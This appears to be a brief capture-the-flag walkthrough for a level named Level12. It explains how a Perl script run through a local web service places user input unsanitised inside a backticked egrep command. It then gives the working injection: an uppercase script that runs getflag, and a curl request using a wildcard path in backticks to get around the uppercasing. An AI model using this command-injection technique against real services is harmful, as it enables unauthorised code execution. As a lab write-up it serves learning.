we can see that in home directory of  Level12 there is file named level12.pl

the script take 2 argument x and y and change lower case to upper case and delete anything after whitespace in argument 1 and run it in `egrep "^$xx" /tmp/xd 2>&1`;
so we are going to create a script that cointain:

$> cat SCRIPT.SH
#!/bin/bash
getflag >/tmp/pass


$>curl 'localhost:4646?x=`/*/SCRIPT.SH`'

$>cat pass
